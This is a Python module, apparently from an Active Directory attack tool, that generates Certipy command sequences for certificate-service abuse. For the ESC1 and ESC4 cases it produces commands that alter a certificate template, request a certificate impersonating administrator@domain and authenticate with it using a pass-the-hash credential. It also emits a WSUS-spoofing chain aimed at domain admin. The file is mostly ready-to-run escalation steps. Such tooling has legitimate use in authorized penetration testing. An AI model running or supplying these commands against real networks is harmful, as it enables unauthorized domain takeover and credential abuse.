from __future__ import annotations

from admapper.core.platform import resolve_certipy


def certipy_install_hint() -> str:
    return "pip install certipy-ad  # or: pipx install certipy-ad"


def build_certipy_find_command(*, domain: str, dc_ip: str, principal: str, auth: str = "-hashes :<NTLM>") -> str:
    user = principal if "@" in principal else f"{principal}@{domain}"
    return f"certipy find -u {user} {auth} -dc-ip {dc_ip} -vulnerable -stdout"


def build_certipy_commands(
    *,
    esc: str,
    domain: str,
    dc_ip: str,
    principal: str,
    template: str,
    ca_name: str,
    auth: str = "-hashes :<NTLM>",
    cert_auth_viable: bool = True,
    wsus_chain_step: bool = False,
) -> list[str]:
    user = principal if "@" in principal else f"{principal}@{domain}"
    base = f"-u {user} {auth} -dc-ip {dc_ip}"
    if esc == "esc4":
        return [
            f"certipy template {base} -template {template} -save-old",
            f"certipy template {base} -template {template} -add-client-auth",
            f"certipy req {base} -ca {ca_name} -template {template} -upn administrator@{domain}",
            f"certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
        ]
    if esc == "template_enrollment":
        cmds = [
            f"certipy find {base} -vulnerable -stdout",
            f"certipy req {base} -ca {ca_name} -template {template} -dns <wsus_or_target_fqdn>",
        ]
        if cert_auth_viable:
            cmds.append(f"certipy auth -pfx <host>.pfx -dc-ip {dc_ip}")
        elif wsus_chain_step:
            cmds.extend(
                [
                    "# Server Authentication only — no Client Auth; certipy auth will NOT yield a login TGT",
                    "admapper wsus -w <workspace>  # WSUS spoofing chain toward DA",
                    "python3 pywsus.py -s <wsus_host> publish ...  # use issued cert for WSUS HTTPS",
                ]
            )
        return cmds
    if esc == "esc1":
        return [
            f"certipy req {base} -ca {ca_name} -template {template} -upn administrator@{domain}",
            f"certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
        ]
    return [build_certipy_find_command(domain=domain, dc_ip=dc_ip, principal=principal, auth=auth)]
